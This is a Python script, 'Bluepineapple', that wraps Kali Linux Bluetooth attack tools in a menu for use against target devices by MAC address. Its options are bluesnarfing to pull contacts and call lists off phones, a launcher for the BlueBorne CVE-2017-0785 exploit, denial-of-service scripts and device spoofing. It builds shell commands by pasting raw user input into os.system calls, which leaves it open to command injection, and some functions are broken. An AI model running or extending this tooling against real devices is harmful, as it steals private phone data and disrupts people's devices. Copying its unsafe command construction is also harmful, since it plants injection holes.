import os
import argparse
import subprocess

parser = argparse.ArgumentParser(description='Bluepineapple is a project to integrate different bluetooth tools to simulate a Pineapple like device. It has been developed for using on Raspberry Pi 4 with Kali Linux installed, however it also works with any kali distribution.')
parser.add_argument('-i','--interface', help='Bluetooth interface, usually hci0',required=True)
args = parser.parse_args()

hci = args.interface

def bluelog(mode):
    if "scan" in mode:
        print("\n\nLogging options: m (manufacturer) n (name) c (class) v (verbose)")
        options = input("Write options (ex: mncv): ")

        os.system("sudo bluelog -i " + hci + " -" + options + " -o ./btdevices.log")

        print("\n\nEnd, devices logged in btdevices.log file")
    elif "show" in mode:
        print("\n\nDevices detected:")
        os.system("sudo cat btdevices.log")
    else:
        print("\n\nInvalid mode.")

def blueranger():
    mac = input("\n\nWrite target MAC address: ")

    os.system("sudo blueranger " + hci + " " + mac)

def btlesniffer():
    print("\n\nPress CTRL + C to stop\n\n")
    os.system("sudo btlesniffer")

def sdptool():
    mac = input("\n\nWrite target MAC address: ")
    os.system("sudo sdptool -i " + hci + " browse --tree --l2cap " + mac + " > target_" + mac + ".log")
    os.system("sudo cat target_" + mac + ".log")

def bluesnarferSetup():
    subprocess.run(["sudo", "mkdir", "-p", "/dev/bluetooth/rfcomm"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "mknod", "-m", "666", "/dev/bluetooth/rfcomm/0", "c", "216", "0"], stdout=subprocess.DEVNULL)

def bluesnarfer(mode):
    bluesnarferSetup()
    mac = input("\n\nWrite target MAC address: ")
    mc = input("Write target channel for messages: ")
    pbc = input("Write target channel for phone book: ")
    dc = 2

    if "list" in mode:
        print("Listing available phone memory information, press CTRL + C to stop process.\n\n")
        os.system("sudo bluesnarfer -b "" " + mac + " -C " + pbc + " -l")
    if "contacts" in mode:
        print("Listing available contacts, press CTRL + C to stop process.\n\n")
        os.system("sudo bluesnarfer -b "" " + mac + " -C " + dc + " -r 1-100 -s ME")
    elif "info" in mode:
        print("Showing device info, press CTRL + C to stop process.\n\n")
        os.system("bluesnarfer -i -b " + mac)
    elif "calls" in mode:
        print("Listing last dialed calls, press CTRL + C to stop process.\n\n")
        os.system("sudo bluesnarfer -b "" " + mac + " -r 1-100 -C " + pbc + "-s DC")
    else:
        print("Invalid action.")

def blueborne():
    mac = input("Write target MAC address: ")
    os.system("sudo python3 CVE-2017-0785.py TARGET=" + mac)

#Custom DoS, not functional, use 100 and 600 for default values
def DoS(seq, size):
    mac = input("Write target MAC address: ")
    os.system("sudo seq " + str(seq) + " > numberofpings")
    os.system("while read r; do l2ping -s " + str(size) + " " + mac + "; done < numberofpings")

def jieggiDoS():
    os.system("sudo python3 ./BLUETOOTH-DOS-ATTACK.py")

def spoofing(mode):
    if 'random' in mode:
        os.system("sudo spooftooph -i " + hci + " -R")
    elif 'interval' in mode:
        interval = input("\n\nWrite interval to spoof nearby devices: ")
        print("\n\nSpoofing in progress (open new terminal to continue bluetoothing)...\n\n")
        subprocess.run(["sudo", "spooftooph", "-i", hci, "-t", interval], stdout=subprocess.DEVNULL)
    if 'custom' in mode:
        mac = input("Write MAC address: ")
        name = input("Write device name: ")
        dclass = input("Write device class (0x0000c): ")
        os.system("sudo spooftooph -i " + hci + " -n " + name + " -a " + mac + " -c " + dclass)
    else:
        print("Invalid action.")

def welcome():
    print("\n\n")
    print("Bluepineapple by [INSERT_CLEVER_NAME_HERE]. it scan, it attac but most importantly it work for old bt devices (sometimes)")

def menu():
    print("\n\n")
    print("1- Scan/show BT devices. Powered by Bluelog")
    print("2- Find/Link strength BT device in range. Powered by Blueranger")
    print("3- BT Sniffer. Powered by Btlesinffer")
    print("4- Detailed info of BT Target. Powered by sdptool")
    print("5- DoS attack. Powered by jieggil script.")
    print("6- Bluesnarfing attack. Powered by Bluesnarfer")
    print("7- Blueborne CVE for android.")
    print("8- Random Spoofing. Powered by spooftooph.")

def bye():
    print("\n\n")
    print("Bye Bye.")

def main():
    action = ""
    welcome()
    while "quit" not in action:
        menu()
        action = input("Choose action (write 'quit' to exit): ")

        if "1" in action:
            bluelog(input("Choose mode (scan or show): "))
        elif "2" in action:
            blueranger()
        elif "3" in action:
            btlesniffer()
        elif "4" in action:
            sdptool()
        elif "5" in action:
            jieggiDoS()
        elif "6" in action:
            mode = input("\n\nChoose bluesnarfer action (list, contacts, calls or info): ")
            bluesnarfer(mode)
        elif "7" in action:
            blueborne()
        elif "8" in action:
            mode = input("\n\nChoose Spoofing action ('random' to generate random info, 'interval' to clone nearby devices or 'custom'): ")
            spoofing(mode)
        elif "quit" in action:
            bye()
        else:
            print("\n\nInvalid option.")

main()
